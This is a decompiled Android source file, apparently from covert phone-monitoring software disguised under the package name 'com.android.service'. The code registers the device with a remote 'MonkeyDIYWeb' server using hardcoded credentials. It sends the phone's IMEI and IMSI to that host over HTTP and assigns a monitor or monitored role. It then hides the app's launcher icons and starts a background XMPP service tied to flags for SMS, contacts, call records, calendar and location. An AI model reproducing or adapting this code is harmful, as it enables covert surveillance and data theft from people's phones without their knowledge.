package com.android.service;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.ValueUtiles;
import java.io.IOException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

public class ActivityLogin extends Activity {
    private static Context MainCtx;
    private EditText StartPSW;
    private AppPreferences _appPrefs;
    private AlertDialog alert;
    private Builder builder;
    private String hostname = "";
    private Button login;
    private ProgressDialog mProgressDialog;
    private EditText phoneNum;
    private String strDataPath = "";
    private String strError;
    private String strUserStartPSW;
    private String strUserphoneNum;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(128, 128);
        requestWindowFeature(1);
        setContentView(R.layout.user_login);
        this._appPrefs = new AppPreferences(this);
        this.hostname = getString(R.string.hostname);
        this.strUserphoneNum = getString(R.string.phonenum);
        this.strUserStartPSW = getString(R.string.password);
        this._appPrefs.saveMainnum(this.strUserphoneNum);
        this._appPrefs.savepsw(this.strUserStartPSW);
        MainCtx = this;
        this.strDataPath = this._appPrefs.getDataPath();
        System.out.println("----strDataPath---:" + this.strDataPath);
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(MainCtx);
        }
        if (haveInternet()) {
            doInitIfNetwork();
        } else {
            new Builder(this).setTitle("網路訊息").setMessage("網路尚未開啟!\n(需在有網路的狀況下操作)").setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    System.exit(0);
                }
            }).setNegativeButton("No", new OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    System.exit(0);
                }
            }).show();
        }
    }

    private void doInitIfNetwork() {
        if (this._appPrefs.getUserid() == null || this._appPrefs.getUserid().length() <= 0) {
            Log.e("strUserphoneNum------>", this.strUserphoneNum);
            String strStatus = "";
            strStatus = checkUserStatus(this.strUserphoneNum);
            if (strStatus.equals("0")) {
                UserFistTimeUserVerification();
                return;
            } else if (strStatus.equals("1")) {
                new Builder(this).setTitle("訊息通知").setMessage("此帳號已啟用!! 請與管理員聯絡!!").setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        System.exit(0);
                    }
                }).show();
                return;
            } else if (strStatus.equals("2")) {
                new Builder(this).setTitle("訊息通知").setMessage("此帳號已停權,請與管理員聯絡!!").setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        System.exit(0);
                    }
                }).show();
                return;
            } else {
                new Builder(this).setTitle("訊息通知").setMessage("無法辦別狀態，請檢查網路!!").setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        System.exit(0);
                    }
                }).show();
                return;
            }
        }
        String strRoleFromLocal = this._appPrefs.getBody();
        if (strRoleFromLocal == null || strRoleFromLocal.length() <= 0) {
            redirectToMorB(checkTheRole(this._appPrefs.getUserid()));
        } else {
            redirectToMorB(strRoleFromLocal);
        }
    }

    /* JADX WARNING: Unknown top exception splitter block from list: {B:21:0x00d2=Splitter:B:21:0x00d2, B:14:0x008e=Splitter:B:14:0x008e} */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x00fd A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0086 A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0086 A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x00fd A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    /* JADX WARNING: Removed duplicated region for block: B:30:0x00fd A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0086 A:{Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }} */
    private java.lang.String checkUserStatus(java.lang.String r18) {
        /*
        r17 = this;
        r2 = "success";
        r1 = "errmsg";
        r13 = "";
        r14 = new java.lang.StringBuilder;
        r15 = "http://";
        r14.<init>(r15);
        r0 = r17;
        r15 = r0.hostname;
        r14 = r14.append(r15);
        r15 = ":8080/MonkeyDIYWeb/user_querystatus?phonenum=";
        r14 = r14.append(r15);
        r0 = r18;
        r14 = r14.append(r0);
        r12 = r14.toString();
        r3 = new org.apache.http.impl.client.DefaultHttpClient;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r3.<init>();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14 = java.lang.System.out;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = new java.lang.StringBuilder;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r16 = "-str_url_login--->";
        r15.<init>(r16);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = r15.append(r12);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = r15.toString();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14.println(r15);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r8 = new org.apache.http.client.methods.HttpGet;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r8.<init>(r12);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14 = java.lang.System.out;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = new java.lang.StringBuilder;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r16 = "-HttpGet--->";
        r15.<init>(r16);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = r15.append(r8);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15 = r15.toString();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14.println(r15);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r9 = 0;
        r10 = "";
        r6 = 0;
        r11 = "";
        if (r8 == 0) goto L_0x007e;
    L_0x005f:
        r9 = r3.execute(r8);	 Catch:{ IOException -> 0x008d, Exception -> 0x00d1 }
        r14 = r9.getEntity();	 Catch:{ IOException -> 0x008d, Exception -> 0x00d1 }
        r10 = org.apache.http.util.EntityUtils.toString(r14);	 Catch:{ IOException -> 0x008d, Exception -> 0x00d1 }
        r7 = new org.json.JSONObject;	 Catch:{ IOException -> 0x008d, Exception -> 0x00d1 }
        r7.<init>(r10);	 Catch:{ IOException -> 0x008d, Exception -> 0x00d1 }
        r14 = "success";
        r11 = r7.getString(r14);	 Catch:{ IOException -> 0x0106, Exception -> 0x0103, all -> 0x0100 }
        r14 = r3.getConnectionManager();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14.shutdown();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r6 = r7;
    L_0x007e:
        r14 = "true";
        r14 = r11.equalsIgnoreCase(r14);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        if (r14 == 0) goto L_0x00fd;
    L_0x0086:
        r14 = "status";
        r13 = r6.getString(r14);	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
    L_0x008c:
        return r13;
    L_0x008d:
        r5 = move-exception;
    L_0x008e:
        r14 = java.lang.System.out;	 Catch:{ all -> 0x00f4 }
        r15 = new java.lang.StringBuilder;	 Catch:{ all -> 0x00f4 }
        r16 = "-IOException--->";
        r15.<init>(r16);	 Catch:{ all -> 0x00f4 }
        r16 = r5.getMessage();	 Catch:{ all -> 0x00f4 }
        r15 = r15.append(r16);	 Catch:{ all -> 0x00f4 }
        r15 = r15.toString();	 Catch:{ all -> 0x00f4 }
        r14.println(r15);	 Catch:{ all -> 0x00f4 }
        r14 = r17.getApplicationContext();	 Catch:{ all -> 0x00f4 }
        r15 = "傳輸錯誤";
        r16 = 1;
        r14 = android.widget.Toast.makeText(r14, r15, r16);	 Catch:{ all -> 0x00f4 }
        r14.show();	 Catch:{ all -> 0x00f4 }
        r14 = r3.getConnectionManager();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14.shutdown();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        goto L_0x007e;
    L_0x00bd:
        r4 = move-exception;
        r4.printStackTrace();
        r14 = r17.getApplicationContext();
        r15 = "失敗!! 請重新輸入!!";
        r16 = 1;
        r14 = android.widget.Toast.makeText(r14, r15, r16);
        r14.show();
        goto L_0x008c;
    L_0x00d1:
        r4 = move-exception;
    L_0x00d2:
        r14 = java.lang.System.out;	 Catch:{ all -> 0x00f4 }
        r15 = new java.lang.StringBuilder;	 Catch:{ all -> 0x00f4 }
        r16 = "-Exception--->";
        r15.<init>(r16);	 Catch:{ all -> 0x00f4 }
        r16 = r4.getMessage();	 Catch:{ all -> 0x00f4 }
        r15 = r15.append(r16);	 Catch:{ all -> 0x00f4 }
        r15 = r15.toString();	 Catch:{ all -> 0x00f4 }
        r14.println(r15);	 Catch:{ all -> 0x00f4 }
        r14 = r3.getConnectionManager();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r14.shutdown();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        goto L_0x007e;
    L_0x00f2:
        r14 = move-exception;
        goto L_0x008c;
    L_0x00f4:
        r14 = move-exception;
    L_0x00f5:
        r15 = r3.getConnectionManager();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        r15.shutdown();	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
        throw r14;	 Catch:{ JSONException -> 0x00bd, Exception -> 0x00f2 }
    L_0x00fd:
        r13 = "";
        goto L_0x008c;
    L_0x0100:
        r14 = move-exception;
        r6 = r7;
        goto L_0x00f5;
    L_0x0103:
        r4 = move-exception;
        r6 = r7;
        goto L_0x00d2;
    L_0x0106:
        r5 = move-exception;
        r6 = r7;
        goto L_0x008e;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.android.service.ActivityLogin.checkUserStatus(java.lang.String):java.lang.String");
    }

    private void UpdataStatus(String strId) {
        String TAG_success = "success";
        String TAG_errmsg = "errmsg";
        try {
            if (!new JSONObject(EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet("http://" + this.hostname + ":8080/MonkeyDIYWeb/user_updatastatus?id=" + strId)).getEntity())).getString("success").equalsIgnoreCase("true")) {
                Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
            }
        } catch (JSONException e) {
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
        } catch (IOException e2) {
            e2.printStackTrace();
            Toast.makeText(getApplicationContext(), "失敗!! 請重新輸入!!", 1).show();
        } catch (Exception e3) {
        }
    }

    private void UserFistTimeUserVerification() {
        String TAG_success = "success";
        String TAG_errmsg = "errmsg";
        try {
            JSONObject json = new JSONObject(EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet("http://" + this.hostname + ":8080/MonkeyDIYWeb/user_verification?phoneNum=" + this.strUserphoneNum + "&StartPSW=" + this.strUserStartPSW)).getEntity()));
            String strSuccess = json.getString("success");
            String strId = json.getString("id");
            String strVersion = json.getString("releasetype");
            if (strSuccess.equalsIgnoreCase("true")) {
                this._appPrefs.saveUserVersion(strVersion);
                this._appPrefs.saveUserid(strId);
                this._appPrefs.saveCountGps("3");
                this._appPrefs.saveCountRecord("3");
                user_insertimei(strId);
                UpdataStatus(this._appPrefs.getUserid());
                String strRole = checkTheRole(this._appPrefs.getUserid());
                processIcon(strRole);
                redirectToMorB(strRole);
                return;
            }
            this.strError = "比對失敗!! 請重新輸入!!";
        } catch (JSONException e) {
            e.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
        } catch (IOException e2) {
            e2.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
        } catch (Exception e3) {
        }
    }

    private void user_insertimei(String strId) {
        TelephonyManager tM = (TelephonyManager) getSystemService("phone");
        String imei = tM.getDeviceId().toLowerCase();
        String imsi = "";
        if (imei == null || imei.length() <= 0) {
            imei = "";
        }
        if (tM.getSimState() != 1) {
            imsi = tM.getSubscriberId().toLowerCase();
        }
        Log.e("imei:", imei);
        Log.e("imsi:", imsi);
        String TAG_success = "success";
        String TAG_errmsg = "errmsg";
        try {
            EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet("http://" + this.hostname + ":8080/MonkeyDIYWeb/user_insertimei?id=" + strId + "&imei=" + imei + "&imsi=" + imsi)).getEntity());
        } catch (IOException e) {
            e.printStackTrace();
            Toast.makeText(getApplicationContext(), "比對錯誤!! 請重新輸入!!", 1).show();
        } catch (Exception e2) {
        }
    }

    private String checkTheRole(String strId) {
        String strGotRole = "";
        String TAG_success = "success";
        String str_url_login = "http://" + this.hostname + ":8080/MonkeyDIYWeb/Pair_queryid?id=" + strId;
        System.out.println("<<<<<<<<<<<<<<====>" + str_url_login);
        try {
            JSONObject json = new JSONObject(EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet(str_url_login)).getEntity()));
            String strSuccess = json.getString("success");
            String strPairPhoneNum = json.getString("PairPhoneNum").toLowerCase();
            String strrole = json.getString("role").toLowerCase();
            this._appPrefs.savePairnum(strPairPhoneNum);
            if (strSuccess.equalsIgnoreCase("true")) {
                if (strrole.equalsIgnoreCase("m")) {
                    strGotRole = "m";
                } else if (strrole.equalsIgnoreCase("b")) {
                    strGotRole = "b";
                }
                this._appPrefs.saveBody(strrole);
            }
        } catch (JSONException e) {
            e.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
        } catch (IOException e2) {
            e2.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
        } catch (Exception e3) {
        }
        return strGotRole;
    }

    private void redirectToMorB(String strrole) {
        try {
            if (strrole.equalsIgnoreCase("m")) {
                this._appPrefs.saveSMSFlag("0");
                this._appPrefs.saveContactsFlag("0");
                this._appPrefs.saveCallrecordFlag("0");
                this._appPrefs.saveCalendarFlag("0");
                this._appPrefs.saveMapFlag("0");
                Intent MainControl = new Intent(this, MainControlActivity.class);
                MainControl.setFlags(268435456);
                startActivity(MainControl);
                finish();
                return;
            }
            Intent xmpp_service = new Intent(this, XmppService.class);
            xmpp_service.setFlags(268435456);
            startService(xmpp_service);
            finish();
        } catch (Exception e) {
            e.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
            finish();
        }
    }

    private void processIcon(String strrole) {
        try {
            hideIconMain(this);
            if (!strrole.equalsIgnoreCase("m")) {
                hideIcon(this);
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.strError = "伺服器更新!! 請稍後在試!!";
        }
    }

    private boolean haveInternet() {
        NetworkInfo info = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        if (info == null) {
            return false;
        }
        if (info.isConnected()) {
            return true;
        }
        return false;
    }

    public static void hideIconMain(Context ctx) {
        Log.e("hideIconMain", "hideIconMain");
        ctx.getPackageManager().setComponentEnabledSetting(new ComponentName("com.android.service", "com.android.service.ActivityLogin"), 2, 1);
    }

    public static void hideIcon(Context ctx) {
        Log.e("hideIcon", "hideIcon");
        ctx.getPackageManager().setComponentEnabledSetting(new ComponentName("com.android.service", "com.android.service.Activity_Login-S"), 2, 1);
    }
}
